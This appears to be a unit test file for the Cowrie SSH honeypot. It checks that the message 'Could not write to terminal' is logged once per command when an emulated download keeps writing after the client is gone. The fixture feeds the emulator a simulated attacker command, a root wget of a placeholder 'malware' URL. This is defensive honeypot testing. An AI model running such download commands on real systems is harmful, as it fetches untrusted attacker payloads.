# SPDX-FileCopyrightText: 2026 Michel Oosterhof <michel@oosterhof.net>
#
# SPDX-License-Identifier: BSD-3-Clause

# ABOUTME: Tests that "Could not write to terminal" is logged once per command
# ABOUTME: per loss episode, not once per write (issue #40691).

from __future__ import annotations

import os
import tempfile
import unittest
from types import SimpleNamespace
from typing import Any

from twisted.logger import globalLogPublisher

from cowrie.shell.pipe import PipeProtocol

os.environ["COWRIE_HONEYPOT_DATA_PATH"] = "data"
os.environ["COWRIE_HONEYPOT_DOWNLOAD_PATH"] = tempfile.gettempdir()
os.environ["COWRIE_SHELL_FILESYSTEM"] = "src/cowrie/data/fs.pickle"


class _RecordingTerminal:
    """Collects every write a connected terminal receives."""

    def __init__(self) -> None:
        self.data: list[bytes] = []

    def write(self, data: bytes) -> None:
        self.data.append(data)


class TerminalLostLogTests(unittest.TestCase):
    """A command that outlives its client (a wget/curl download still
    feeding its progress meter after the attacker hung up) must log
    "Could not write to terminal" once per command per loss episode, not
    once per write (#40691)."""

    MESSAGE = "Connection was probably lost. Could not write to terminal"

    def setUp(self) -> None:
        self.events: list[str] = []
        globalLogPublisher.addObserver(self._observe)

    def tearDown(self) -> None:
        globalLogPublisher.removeObserver(self._observe)

    def _observe(self, event: dict[str, Any]) -> None:
        if self.MESSAGE in str(event.get("log_format", "")):
            self.events.append(str(event["log_format"]))

    def make_pipe(self, terminal: Any) -> PipeProtocol:
        return PipeProtocol(
            SimpleNamespace(terminal=terminal),
            cmd="wget",
            cmdargs=["http://example.invalid/malware"],
            input_data=None,
            cwd="/root",
            user={"uid": 0, "gid": 0, "username": "root", "home": "/root"},
        )

    def test_stderr_flood_logs_one_line(self) -> None:
        """Thousands of stderr writes from a download progress meter
        after the client is gone produce exactly one log line."""
        pipe = self.make_pipe(None)
        for _ in range(3000):
            pipe.write_stderr(b"-\r")
        self.assertEqual(len(self.events), 1)

    def test_stdout_flood_logs_one_line(self) -> None:
        """The same throttle holds for stdout writers (curl -O)."""
        pipe = self.make_pipe(None)
        for _ in range(100):
            pipe.write_stdout(b"  10%  \r")
        self.assertEqual(len(self.events), 1)

    def test_stdout_and_stderr_share_one_line(self) -> None:
        """Both streams of one command are throttled together: the flag
        lives on the PipeProtocol instance, not per fd."""
        pipe = self.make_pipe(None)
        pipe.write_stdout(b"a")
        pipe.write_stderr(b"b")
        pipe.write_stdout(b"c")
        self.assertEqual(len(self.events), 1)

    def test_one_line_per_command(self) -> None:
        """Every command that lost its client is still recorded once."""
        for _ in range(3):
            pipe = self.make_pipe(None)
            pipe.write_stdout(b"x")
            pipe.write_stderr(b"y")
        self.assertEqual(len(self.events), 3)

    def test_delivery_while_terminal_connected(self) -> None:
        """Output is delivered normally and nothing is logged while the
        terminal is present."""
        terminal = _RecordingTerminal()
        pipe = self.make_pipe(terminal)
        pipe.write_stdout(b"hello\n")
        pipe.write_stderr(b"warning\n")
        self.assertEqual(terminal.data, [b"hello\n", b"warning\n"])
        self.assertEqual(self.events, [])

    def test_writes_resume_if_terminal_returns(self) -> None:
        """The terminal is checked per write: delivery resumes when it
        reappears, and a fresh loss episode is recorded once more."""
        pipe = self.make_pipe(None)
        pipe.write_stdout(b"lost\n")
        self.assertEqual(len(self.events), 1)
        terminal = _RecordingTerminal()
        pipe.protocol.terminal = terminal
        pipe.write_stdout(b"back\n")
        self.assertEqual(terminal.data, [b"back\n"])
        self.assertEqual(len(self.events), 1)
        pipe.protocol.terminal = None
        pipe.write_stdout(b"lost again\n")
        self.assertEqual(len(self.events), 2)
        pipe.write_stdout(b"still gone\n")
        self.assertEqual(len(self.events), 2)


if __name__ == "__main__":
    unittest.main()
